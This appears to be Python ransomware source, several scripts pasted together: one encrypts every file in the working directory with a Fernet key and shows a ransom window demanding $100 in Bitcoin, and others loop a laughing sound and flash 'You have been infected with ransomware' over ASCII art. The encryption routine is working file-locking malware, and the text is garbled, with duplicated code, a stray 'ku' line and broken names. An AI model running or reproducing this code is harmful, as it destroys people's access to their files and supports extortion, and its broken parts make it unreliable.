from cryptography.fernet import Fernet
from os import listdir, path
import tkinter as tk
from time import sleep


def load_key():
    if path.exists("encryption.key"):
        with open("encryption.key", "rb") as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open("encryption.key", "wb") as key_file:
            key_file.write(key)
        return key

KEY_1 = load_key()
ENC = Fernet(KEY_1)

def Encrypt(file_name):
    with open(file_name, 'rb') as file:
        data = file.read()
    encrypted_data = ENC.encrypt(data)
    with open(file_name, 'wb') as file:
        file.write(encrypted_data)

def Decrypt(file_name):
    with open(file_name, 'rb') as file:
        data = file.read()
    decrypted_data = ENC.decrypt(data)
    with open(file_name, 'wb') as file:
        file.write(decrypted_data)


TARGET_DIR = "."
EXCLUDE = ['.py','.key','log']


def show_fake_ransomware_screen():
    window = tk.Tk()
    window.title("Your Files Are Encrypted!")
    window.geometry("400x300")
    
    
    label = tk.Label(window, text="WARNING: All your files are encrypted.\nTo recover them, pay $100 to the following address:\nBitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", font=("Helvetica", 12), justify=tk.CENTER)
    label.pack(pady=20)
    
    
    encrypting_label = tk.Label(window, text="Encrypting files...", font=("Helvetica", 10), fg="red")
    encrypting_label.pack(pady=10)

    
    window.after(1000, lambda: encrypting_label.config(text="Encrypting files... Please wait"))
    
    
    window.after(5000, window.destroy)
    window.mainloop()


def encrypt_files():
    for filename in listdir(TARGET_DIR):
        filepath = path.join(TARGET_DIR, filename)
        if path.isfile(filepath) and not any(filepath.endswith(ext) for ext in EXCLUDE):
            Encrypt(filepath)

    print("Encryption completed! Key saved to encryption.key")


show_fake_ransomware_screen()


encrypt_files()


ku
def load_key():
    if path.exists("encryption.key"):
        with open("encryption.key", "rb") as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open("encryption.key", "wb") as key_file:
            key_file.write(key)
        return key

KEY_1 = load_key()
ENC = Fernet(KEY_1)

def Encrypt(file_name):
    with open(file_name, 'rb') as file:
        data = file.read()
    encrypted_data = ENC.encrypt(data)
    with open(file_name, 'wb') as file:
        file.write(encrypted_data)

def Decrypt(file_name):
    with open(file_name, 'rb') as file:
        data = file.read()
    decrypted_data = ENC.decrypt(data)
    with open(file_name, 'wb') as file:
        file.write(decrypted_data)


TARGET_DIR = "."
EXCLUDE = ['.py', '.exe', '.dll', '.key','log']

for filename in listdir(TARGET_DIR):
    filepath = path.join(TARGET_DIR, filename)
    if path.isfile(filepath) and not any(filepath.endswith(ext) for ext in EXCLUDE):
        Encrypt(filepath)

print("Encryption completed! Key saved to encryption.key")
import colorama
from time import sleep
import pygame
from playsound import playsound
import threading

def play_music():
    while True:
        playsound("laugh")


thread = threading.Thread(target=play_music, daemon=True)
thread.start()
import os

while true:    
    print(Back.WHITE+"""
    
    
    
    ⠀⠀⠀⠀⠀⠀⠀           ⢀⣀⣠⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣷⣶⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⢟⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⣰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⣠⣾⢿⣿⣿⣿⡄⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣼⣿⢁⣿⣿⣿⣿⣿⢀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢘⣿⣿⣿⣿⣿⣿⣿⣿⠀⢡⠀⠀⠀
    ⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢈⣿⣿⣿⣿⣿⣿⣿⣿⠀⣎⠆⠀⠀
    ⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢀⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⡰⠇⠀⠀
    ⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⡳⠁⠀⠀
    ⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣸⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣯⢳⠁⠀⠀
    ⡐⠁⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⣸⣿⣿⣿⣿⣿⣿⣧⡙⣿⣿⣿⣇⠃⠀⠀
    ⠙⠲⢦⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠻⠟⠫⠩⠍⠀⣰⠾⢹⣿⣿⣛⣛⣻⣿⣿⣌⠻⣷⣏⠆⠀⠀
    ⠀⠐⡈⣯⢴⠾⣄⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⡀⢀⣠⣤⣦⣴⣤⡀⣠⣼⣦⠟⣠⡾⠟⠋⢉⠉⠉⠉⠉⠁⣘⢻⡇⠀⠀
    ⠀⠀⢡⣷⢸⣿⣿⣂⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⡿⣋⡅⠂⢸⣷⠀⡀⠀⠀⠀⠐⢻⣿⣿⣌⠆
    ⠀⠀⢀⣿⢸⣿⣿⣿⣷⣦⡻⣿⣿⣿⣿⡿⠻⣿⣿⣿⠿⠋⢠⣴⣾⣿⣿⣿⣿⣿⣿⡿⢿⣫⣶⣟⣿⣿⠢⠋⠀⠀⣿⡏⢠⣀⠒⢶⠀⣄⢂⠉⠙⠉⠀
    ⠀⠀⢸⣽⡇⢿⣿⣿⣿⣿⣷⣄⠉⢁⢠⣷⣤⣄⡈⣁⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣶⡾⣿⡿⠟⣋⠉⠀⠀⠀⠀⢰⣾⡏⢰⢈⣿⣿⠀⢹⣾⢀⠀⠀⠀
    ⠀⣴⣿⣿⣷⣶⣮⣭⣟⣛⣛⡂⡼⠦⣾⣿⣻⣿⣿⣿⣳⣜⣛⣻⣭⣷⣾⣿⡿⣿⠽⠟⠁⣠⣶⣷⣆⠀⠀⠀⠀⢸⣿⡇⢸⣿⣿⣿⠀⠈⠣⠘⠀⠀⠀
    ⠚⢿⣿⣟⣿⣿⡈⠻⠍⢿⣿⡇⠄⠀⠈⢻⣿⣿⣻⣿⣿⣭⣿⡭⠉⠁⠄⠈⠁⠀⢀⢠⣇⠛⠉⠋⠀⠀⠀⠀⠀⢸⣿⠇⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠈⠋⠁⠀⠈⠁⠀⢨⣿⡿⠀⡴⢰⢡⣿⣿⣿⣿⣿⣿⣿⢃⠖⡀⠔⢠⢊⢠⣼⠾⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣽⡿⠃⣄⠶⠁⣰⣿⣿⣿⣿⢻⣿⡏⣰⠠⣽⣆⢹⣿⠘⣿⡇⡿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⠀⣴⣿⣦⢰⣿⣿⣿⣿⣿⢸⣿⡇⣿⠀⣾⣿⡈⢿⣷⠹⡛⠁⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⢸⣿⣧⣿⡆⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢀⡿⢧⡟⣷⡾⣿⣿⣆⣿⣿⣿⢹⣿⣧⢸⣿⢀⣿⠇⠛⣭⡄⢤⣤⠰⣿⠀⠀⠀⠀⠀⠀⠀⠀⣰⣾⡇⢸⣿⢿⣿⡇⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠸⢧⡿⣾⣿⢱⣿⣇⠿⢿⡻⠟⠻⣛⠁⣈⣥⢠⣾⣶⡹⣿⣿⡜⣿⣧⠻⠃⠀⠀⠀⠀⠀⢀⣰⣿⣿⠁⣾⣿⢡⣿⡇⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⡶⣶⣰⣦⢆⣴⡐⣴⣶⢶⣾⡇⢹⣿⢃⣻⣿⡘⣿⣧⡇⠻⠟⠃⢉⡄⠀⠂⣀⣀⣀⡤⠔⣫⣿⣿⠃⣸⡿⣿⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⣾⣼⣿⣿⢇⡞⣧⣽⣿⢟⣼⣿⢣⣿⣿⠄⢿⠟⢃⡍⣩⡴⠀⣘⡋⣀⠄⣀⣴⣭⣿⣿⣿⣿⡿⠟⢁⣼⡟⢠⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠟⡋⠿⠟⠸⠿⣉⣙⡛⡸⣿⠋⢀⣭⣬⡔⢠⣿⡏⢀⡿⠀⢠⣽⡀⣶⣾⠘⣿⣏⣠⣶⣛⣷⣶⣶⣿⣿⣷⣿⣿⣿⣿⣿⣟⣷⡀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⡇⣿⣿⣸⣿⡿⣿⣇⡁⣿⣷⠎⢿⡿⠁⡈⠏⣀⢸⣶⣶⢸⣿⠇⣿⣷⣾⣉⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢿⣿⡿⠁⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣁⢛⣁⣈⣛⣂⣌⣉⣤⣤⣥⠶⣶⣶⡔⢿⣿⡿⠸⣿⣏⠸⣿⣶⢹⣿⣿⣿⣿⣿⣟⡻⠾⠿⠿⠿⠿⣭⣜⣛⣻⣿⡾⠛⠁⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠹⡇⣾⡟⢿⣿⡿⢿⣿⣿⢿⣿⡧⣟⣽⠃⡘⣿⣧⠂⣿⣿⣜⣿⣷⣬⣿⣿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠉⠐⠒⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢠⣤⢨⣀⡈⡏⣁⡀⣿⢹⣟⣿⠇⣬⣹⣆⢷⣿⣿⣆⠻⣿⣿⣿⡿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢠⣶⣟⣼⣿⣸⣷⣿⣇⣿⣾⣿⣿⣧⣸⣿⣿⣮⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠙⠾⠷⠿⠿⠿⢿⣿⣿⣿⣿⣿⠿⠿⠿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    
    """)
    os.system("clear"if os.name=="nt" else "clear")
    print(Back.WHITE+"You have been infected with ransomware. Get well soon.")
    sleep(0.1)
    print(Back.BLACK+"""
    
    
    
    ⠀⠀⠀⠀⠀⠀⠀           ⢀⣀⣠⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣷⣶⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⢟⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⣰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⣠⣾⢿⣿⣿⣿⡄⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣼⣿⢁⣿⣿⣿⣿⣿⢀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢘⣿⣿⣿⣿⣿⣿⣿⣿⠀⢡⠀⠀⠀
    ⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢈⣿⣿⣿⣿⣿⣿⣿⣿⠀⣎⠆⠀⠀
    ⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢀⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⡰⠇⠀⠀
    ⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⡳⠁⠀⠀
    ⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣸⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣯⢳⠁⠀⠀
    ⡐⠁⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⣸⣿⣿⣿⣿⣿⣿⣧⡙⣿⣿⣿⣇⠃⠀⠀
    ⠙⠲⢦⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠻⠟⠫⠩⠍⠀⣰⠾⢹⣿⣿⣛⣛⣻⣿⣿⣌⠻⣷⣏⠆⠀⠀
    ⠀⠐⡈⣯⢴⠾⣄⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⡀⢀⣠⣤⣦⣴⣤⡀⣠⣼⣦⠟⣠⡾⠟⠋⢉⠉⠉⠉⠉⠁⣘⢻⡇⠀⠀
    ⠀⠀⢡⣷⢸⣿⣿⣂⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⡿⣋⡅⠂⢸⣷⠀⡀⠀⠀⠀⠐⢻⣿⣿⣌⠆
    ⠀⠀⢀⣿⢸⣿⣿⣿⣷⣦⡻⣿⣿⣿⣿⡿⠻⣿⣿⣿⠿⠋⢠⣴⣾⣿⣿⣿⣿⣿⣿⡿⢿⣫⣶⣟⣿⣿⠢⠋⠀⠀⣿⡏⢠⣀⠒⢶⠀⣄⢂⠉⠙⠉⠀
    ⠀⠀⢸⣽⡇⢿⣿⣿⣿⣿⣷⣄⠉⢁⢠⣷⣤⣄⡈⣁⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣶⡾⣿⡿⠟⣋⠉⠀⠀⠀⠀⢰⣾⡏⢰⢈⣿⣿⠀⢹⣾⢀⠀⠀⠀
    ⠀⣴⣿⣿⣷⣶⣮⣭⣟⣛⣛⡂⡼⠦⣾⣿⣻⣿⣿⣿⣳⣜⣛⣻⣭⣷⣾⣿⡿⣿⠽⠟⠁⣠⣶⣷⣆⠀⠀⠀⠀⢸⣿⡇⢸⣿⣿⣿⠀⠈⠣⠘⠀⠀⠀
    ⠚⢿⣿⣟⣿⣿⡈⠻⠍⢿⣿⡇⠄⠀⠈⢻⣿⣿⣻⣿⣿⣭⣿⡭⠉⠁⠄⠈⠁⠀⢀⢠⣇⠛⠉⠋⠀⠀⠀⠀⠀⢸⣿⠇⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠈⠋⠁⠀⠈⠁⠀⢨⣿⡿⠀⡴⢰⢡⣿⣿⣿⣿⣿⣿⣿⢃⠖⡀⠔⢠⢊⢠⣼⠾⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣽⡿⠃⣄⠶⠁⣰⣿⣿⣿⣿⢻⣿⡏⣰⠠⣽⣆⢹⣿⠘⣿⡇⡿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⠀⣴⣿⣦⢰⣿⣿⣿⣿⣿⢸⣿⡇⣿⠀⣾⣿⡈⢿⣷⠹⡛⠁⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⢸⣿⣧⣿⡆⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢀⡿⢧⡟⣷⡾⣿⣿⣆⣿⣿⣿⢹⣿⣧⢸⣿⢀⣿⠇⠛⣭⡄⢤⣤⠰⣿⠀⠀⠀⠀⠀⠀⠀⠀⣰⣾⡇⢸⣿⢿⣿⡇⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠸⢧⡿⣾⣿⢱⣿⣇⠿⢿⡻⠟⠻⣛⠁⣈⣥⢠⣾⣶⡹⣿⣿⡜⣿⣧⠻⠃⠀⠀⠀⠀⠀⢀⣰⣿⣿⠁⣾⣿⢡⣿⡇⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⡶⣶⣰⣦⢆⣴⡐⣴⣶⢶⣾⡇⢹⣿⢃⣻⣿⡘⣿⣧⡇⠻⠟⠃⢉⡄⠀⠂⣀⣀⣀⡤⠔⣫⣿⣿⠃⣸⡿⣿⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⣾⣼⣿⣿⢇⡞⣧⣽⣿⢟⣼⣿⢣⣿⣿⠄⢿⠟⢃⡍⣩⡴⠀⣘⡋⣀⠄⣀⣴⣭⣿⣿⣿⣿⡿⠟⢁⣼⡟⢠⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠟⡋⠿⠟⠸⠿⣉⣙⡛⡸⣿⠋⢀⣭⣬⡔⢠⣿⡏⢀⡿⠀⢠⣽⡀⣶⣾⠘⣿⣏⣠⣶⣛⣷⣶⣶⣿⣿⣷⣿⣿⣿⣿⣿⣟⣷⡀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⡇⣿⣿⣸⣿⡿⣿⣇⡁⣿⣷⠎⢿⡿⠁⡈⠏⣀⢸⣶⣶⢸⣿⠇⣿⣷⣾⣉⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢿⣿⡿⠁⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣁⢛⣁⣈⣛⣂⣌⣉⣤⣤⣥⠶⣶⣶⡔⢿⣿⡿⠸⣿⣏⠸⣿⣶⢹⣿⣿⣿⣿⣿⣟⡻⠾⠿⠿⠿⠿⣭⣜⣛⣻⣿⡾⠛⠁⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠹⡇⣾⡟⢿⣿⡿⢿⣿⣿⢿⣿⡧⣟⣽⠃⡘⣿⣧⠂⣿⣿⣜⣿⣷⣬⣿⣿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠉⠐⠒⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢠⣤⢨⣀⡈⡏⣁⡀⣿⢹⣟⣿⠇⣬⣹⣆⢷⣿⣿⣆⠻⣿⣿⣿⡿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⢠⣶⣟⣼⣿⣸⣷⣿⣇⣿⣾⣿⣿⣧⣸⣿⣿⣮⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠙⠾⠷⠿⠿⠿⢿⣿⣿⣿⣿⣿⠿⠿⠿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    
    """)
    print(Back.WHITE+"You have been infected with ransomware. Get well soon.")
    os.system("clear"if os.name=="nt" else "clear")
    sleep(0.1)
